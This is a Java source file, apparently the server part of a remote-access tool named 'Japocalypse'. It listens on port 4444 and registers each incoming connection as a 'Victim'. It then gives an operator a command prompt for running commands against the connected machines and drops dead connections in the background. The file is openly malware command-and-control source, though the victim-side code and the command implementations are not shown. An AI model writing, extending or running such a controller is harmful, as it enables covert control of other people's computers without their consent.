package Server;

import java.io.IOException;
import java.net.ServerSocket;
import java.util.ArrayList;
import java.util.Collections;
import java.util.List;
import java.util.Scanner;

/**
 * Created by mpampis on 7/2/2017.
 */
public class Japocalypse {
    private List<Victim> victimList = Collections.synchronizedList(new ArrayList<Victim>()); // this is the list of all the victims
    private ArrayList<Command> commandList = new ArrayList<>(); // this is a list for server commands
    private ArrayList<VictimCommand> victimCommands = new ArrayList<>(); // this is a list for victimCommands

    public Japocalypse() {
        commandList = Utilities.loadServerCommands(this); // add all the commands in commandsList
        victimCommands = Utilities.loadVictimCommands();

        new AcceptConnections(victimList).start();
        new RemoveConnections(victimList).start();

        while(true) {
            Command command = readCommand();
            executeServerCommand(command);
        }
    }


    /**
     * Checks whether a command is valid
     * @param command the command
     * @return true if the command is valid, false otherwise.
     */
    private boolean isValidCommand(Command command) {
        return Utilities.indexOf(commandList, command) != -1;
    }

    /**
     * Reading a command from the user
     * @return the command which the user typed
     */
    private Command readCommand() {
       return  new Command(Utilities.read("Japocalypse> "));
    }

    public void printConnectedMachines() {
        try {
            Utilities.removeDeadConnections(victimList); // update the list
        }
        catch(RuntimeException e) {

        }

        Utilities.printList(victimList);
    }

    public List<Victim> getVictimList() {
        return victimList;
    }

    /**
     * This method handle a victim
     * @param victim the victim to be handle.
     * @return true if you handled the victim sucessfully or false if there was an error.
     */
    public boolean handleVictim(Victim victim) {
        while(true) {
            String str = Utilities.read(victim.getIP() + ": ");

            if(str.equals("back")) {
                break;
            }

            int index = Utilities.indexOf(victimCommands, str); // find the command index inside the victimCommands

            if (index >= 0) {
                String[] args = Utilities.extractArguments(str); // take the arguments
                VictimCommand command = victimCommands.get(index); // take the command

                boolean result = command.execute(victim, args); // execute the command and take the result

                if(!result) { // if it wasn't successful
                    System.out.println("Connection refused: " + victim.getIP());

                    if(victim.isAlive()) { // if the client is alive, kill him
                        victim.kill();
                    }

                    return false; // the victim is dead :/
                }
            }
        }

        return true;
    }

    public boolean executeServerCommand(Command command) {
        int index = Utilities.indexOf(commandList, command); // try to find the command in the commandList

        if(index > -1) {

            ArrayList<String> argList = new ArrayList<>();
            String[] strs = command.toString().split(" ");

            for(int i = 1; i < strs.length;i++) { // we start from 1 cuz the 0 is the command itself not its arguments
                argList.add(strs[i]);
            }

            String[] argArray = argList.toArray(new String[argList.size()]); // converting the list to array
            return commandList.get(index).execute(argArray); // executing the command with arguments
        }

        return false;
    }

}


class RemoveConnections extends Thread {
    private List<Victim> victimList;

    public RemoveConnections(List<Victim> victimList) {
        this.victimList = victimList;
    }



    @Override
    public void run() {
        while(!interrupted()) {
            try {
                Thread.sleep(15 * 1000);
                Utilities.removeDeadConnections(victimList);
            }
            catch(InterruptedException | RuntimeException e) {

            }
        }
    }
}

/**
 * This is a thread which continuesly adds victims to the victimList
 */
class AcceptConnections extends Thread {
    private List<Victim> list;

    public AcceptConnections(List<Victim> list) {
        this.list = list;
    }

    @Override
    public void run() {
        try {
            ServerSocket serverSocket = new ServerSocket(4444);
            while(!interrupted()) {
                try {
                    Victim victim = new Victim(serverSocket.accept());
                    list.add(victim);
                    System.out.println(victim.getID() + " connected: " + victim.getSocket().getInetAddress().getHostAddress());
                }
				catch (IOException ex) {

                }
            }
        }
		catch (IOException ex) {

        }
    }
}
